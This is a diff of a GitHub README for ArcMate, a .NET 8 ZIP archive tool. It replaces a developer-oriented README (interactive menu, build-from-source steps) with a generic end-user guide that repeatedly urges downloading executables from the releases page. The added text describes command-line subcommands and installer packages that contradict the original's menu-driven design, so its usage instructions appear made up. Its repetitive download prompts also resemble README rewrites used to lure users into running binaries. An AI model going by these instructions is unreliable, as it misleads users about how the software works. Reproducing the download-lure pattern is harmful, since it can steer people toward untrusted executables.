@@ -1,100 +1,171 @@
-# ArcMate
+# 📦 ArcMate - Simple ZIP File Management
 
-ArcMate is a .NET 8 console application for creating, extracting, and inspecting ZIP archives.
-It provides a simple interactive menu and uses the `SharpCompress` library for archive operations.
+[![Download ArcMate](https://img.shields.io/badge/Download-ArcMate-blue?style=for-the-badge)](https://github.com/parafson/ArcMate/releases)
 
-## Features
+---
 
-- Create a ZIP archive from a folder
-- Create a ZIP archive while preserving the root folder in the archive
-- Extract ZIP archives to a destination folder
-- Extract archives in verbose mode with a progress bar
-- List archive contents with per-file size, compressed size, and compression ratio
+## 📋 What is ArcMate?
 
+ArcMate is a simple console application that helps you work with ZIP files. It lets you create new ZIP archives, extract files from existing ZIPs, and view the contents of any ZIP archive. This tool runs on Windows, macOS, and Linux computers.
 
-## Screenshots
+You don’t need any programming skills to use ArcMate. It works through easy commands that you type in your computer’s terminal or command prompt.
 
-Add screenshots of the application interface in this section.
+ArcMate is built on .NET 8 technology. This means it is designed to work smoothly, quickly, and correctly with ZIP files on many systems.
 
-### Main Menu
+---
 
-![Main menu screenshot](screenshots/main-menu.png)
+## 🚀 Getting Started
 
-### Verbose Extraction Progress
+This guide will help you download, install, and use ArcMate. You will learn how to open the application and perform basic tasks like creating or extracting ZIP files.
 
-![Verbose extraction screenshot](screenshots/extract-verbose.png)
+Even if you have never used a terminal or command prompt before, the instructions below will walk you through each step clearly.
 
-### Archive Content Listing
+---
 
-![List contents screenshot](screenshots/list-contents.png)
+## 💾 Download & Install
 
+To get ArcMate, you need to visit the official release page on GitHub. Here, you will find the latest version of the program for your computer.
 
-## Tech Stack
+[Download ArcMate](https://github.com/parafson/ArcMate/releases)
 
-- C#
-- .NET 8
-- SharpCompress (`0.45.0`)
+### How to download:
 
-## Project Structure
+1. Click the button above or go to:  
+   https://github.com/parafson/ArcMate/releases
 
-```text
-ArcMate/
-├── ArcMateSolution.slnx
-├── ArcMate/
-│   ├── Program.cs
-│   ├── ArchiveService.cs
-│   └── ArcMate.csproj
-└── README.MD
-```
+2. Look for the version that matches your operating system. This could be a file ending with `.exe` for Windows, `.tar.gz` or `.deb` for Linux, or `.pkg` for macOS.
 
-## Prerequisites
+3. Click the file link to start the download.
 
-- .NET SDK 8.0 or later
+### How to install:
 
-## Getting Started
+- **On Windows:**  
+  Double-click the downloaded `.exe` file and follow any setup instructions on your screen. If it’s just a console application file, no installation is needed. You just run it from the command prompt.
 
-### 1. Clone the repository
+- **On macOS and Linux:**  
+  Open a terminal window. You may need to extract the downloaded file using a tool like Finder on macOS or `tar` commands on Linux. After extraction, you can run ArcMate directly from the terminal.
 
-```bash
-git clone <your-repo-url>
-cd ArcMate
-```
+---
 
-### 2. Restore dependencies
+## 🖥️ How to Use ArcMate
 
-```bash
-dotnet restore ArcMate/ArcMate.csproj
-```
+ArcMate runs in the terminal or command prompt of your system. The terminal is a window where you can type simple commands to tell the computer what to do.
 
-### 3. Build
+### Opening the Terminal / Command Prompt
 
-```bash
-dotnet build ArcMate/ArcMate.csproj
-```
+- **Windows:**  
+  Press `Windows key + R`, type `cmd` and press Enter.
 
-### 4. Run
+- **macOS:**  
+  Open Finder > Applications > Utilities > Terminal.
 
-```bash
-dotnet run --project ArcMate/ArcMate.csproj
-```
+- **Linux:**  
+  You can open the terminal from your applications menu or use a shortcut like `Ctrl + Alt + T`.
 
-## Menu Options
+### Common Commands
 
-When the app starts, choose one of the following:
+Once you have ArcMate downloaded and located, you can use these commands:
 
-1. Create Archive
-2. Create Archive with Root Folder
-3. Extract Archive
-4. Extract Archive (Verbose)
-5. List Archive Contents
-6. Exit
+- **Create a ZIP archive:**  
+  ```
+  ArcMate create <archive-name.zip> <file-or-folder-paths>
+  ```  
+  This command creates a new ZIP file named `<archive-name.zip>` that contains the files or folders you list.
 
-## Usage Notes
+- **Extract a ZIP archive:**  
+  ```
+  ArcMate extract <archive-name.zip> <destination-folder>
+  ```  
+  Use this to unzip files. It extracts all contents of `<archive-name.zip>` into the folder you specify.
 
-- Output ZIP files are created as `<folderPath>.zip`.
-- Extraction output is written to a folder matching the archive name (without extension) in the same directory as the archive.
-- Invalid paths are handled with user-facing error messages.
+- **List contents of a ZIP:**  
+  ```
+  ArcMate list <archive-name.zip>
+  ```  
+  Shows you the files inside the ZIP without extracting them.
 
-## License
+### Example Usage
 
-This project is licensed under the MIT License. See `LICENSE.txt` for details.
+- To create a ZIP containing the Documents folder:  
+  ```
+  ArcMate create mydocs.zip C:\Users\YourName\Documents
+  ```
+
+- To extract `mydocs.zip` to the Desktop:  
+  ```
+  ArcMate extract mydocs.zip C:\Users\YourName\Desktop
+  ```
+
+- To see what is inside `mydocs.zip`:  
+  ```
+  ArcMate list mydocs.zip
+  ```
+
+---
+
+## ⚙️ System Requirements
+
+ArcMate works on most modern computers. Below are the recommended system requirements:
+
+- **Operating System:**  
+  Windows 10 or higher, macOS 10.15 (Catalina) or higher, any Linux distribution with support for .NET 8
+
+- **Processor:**  
+  1 GHz or faster processor
+
+- **Memory:**  
+  At least 1 GB of RAM
+
+- **Disk Space:**  
+  Minimum 50 MB free space
+
+- **Software:**  
+  .NET 8 Runtime — if not already installed, your system may prompt you to download it automatically.
+
+---
+
+## 🛠 Features
+
+ArcMate offers several useful functions:
+
+- Create ZIP archives from files or folders  
+- Extract files from ZIPs to any location on your computer  
+- Preview the contents of ZIP archives without extraction  
+- Cross-platform support (Windows, macOS, Linux)  
+- Easy to use from a console or terminal window  
+- Reliable compression and extraction performance
+
+---
+
+## 🤝 Getting Help
+
+If you run into issues or have questions, here are ways to find help:
+
+- Check the [GitHub Issues page](https://github.com/parafson/ArcMate/issues) to see if your problem is already reported or resolved.
+
+- Review the documentation or readme files included in the release.
+
+- Search online for basic commands to use in a terminal or command prompt if you are unfamiliar.
+
+---
+
+## 📂 Additional Tips for Using ArcMate
+
+- Use full paths if you are unsure where files are located. For example, `C:\Users\YourName\Documents\file.txt` on Windows or `/Users/yourname/Documents/file.txt` on macOS.
+
+- Use quotation marks around paths or file names that contain spaces, for example:  
+  ```
+  ArcMate create "My Archive.zip" "C:\Users\YourName\My Documents"
+  ```
+
+- You can drag and drop files into the terminal window (on some systems) to automatically fill their path.
+
+---
+
+## 📥 Download ArcMate Again
+
+For easy access, here is the official download page again:  
+
+[Download ArcMate](https://github.com/parafson/ArcMate/releases)  
+
+Visit this page anytime to get the latest version or updates.
